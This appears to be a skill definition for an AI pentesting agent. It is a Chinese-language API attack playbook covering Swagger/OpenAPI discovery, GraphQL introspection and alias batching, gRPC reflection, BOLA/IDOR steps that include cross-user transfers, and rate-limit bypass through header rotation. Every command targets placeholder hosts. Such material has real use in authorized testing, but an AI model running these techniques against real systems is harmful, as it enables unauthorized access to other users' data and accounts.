---
name: api-attack
description: API 专项：GraphQL introspection 与批量查询、gRPC 反射、OpenAPI/Swagger 泄露、BOLA/越权、限速绕过
whenToUse: 目标是前后端分离或移动端 API，或只有 JSON 端点没有页面
role: exploit
enabled: true
---

# API 攻击

## 先找文档

~~~bash
for p in /swagger-ui.html /swagger/index.html /v2/api-docs /v3/api-docs /openapi.json /api-docs /doc.html; do
  code=$(curl -s -o /dev/null -w '%{http_code}' "http://TARGET$p"); [ "$code" = 200 ] && echo "HIT $p"
done
~~~

拿到 OpenAPI：paths 全导出 -> 逐条测未授权（去 token）-> 再测越权（换 B 用户 token）。

## GraphQL

~~~bash
curl -s -X POST http://TARGET/graphql -H 'content-type: application/json' \
  -d '{"query":"{__schema{types{name fields{name}}}}"}' | head -c 800
# 批量别名打限速
{"query":"{a:user(id:1){name} b:user(id:2){name} c:user(id:3){name}}"}
~~~

## gRPC

~~~bash
grpcurl -plaintext TARGET:PORT list
grpcurl -plaintext TARGET:PORT describe Service
grpcurl -plaintext -d '{"id":1}' TARGET:PORT Service/Method
~~~

## BOLA / IDOR（API 最常见）

~~~
1. A 的 token 请求 /api/v1/orders/{B的id}
2. A 的 token 请求 /api/v1/users/{A}/transfer?to={B}
3. 去掉 token 再试（网关只校验路径白名单时成立）
4. 改方法：GET->PUT/DELETE 绕过权限
5. 降版本：/v1/ 无校验、/v2/ 有 -> 用 v1 打
~~~

## 限速与配额

~~~
阈值：10/30/60 次每分钟，看 429 出现在第几次
绕过：X-Forwarded-For 轮换、X-Real-IP、换 token、换 UA
并发只对幂等接口（查询/登录），别对写接口并发
~~~

## 判据

- 越权：拿到**另一个用户的数据**（不是空数组、不是 403）
- GraphQL：introspection 全量返回 = 信息泄露；跨用户读 = BOLA
- 落库 category=unauthorized 或 auth-bypass，evidence 贴两份请求（A 的 token / B 的结果）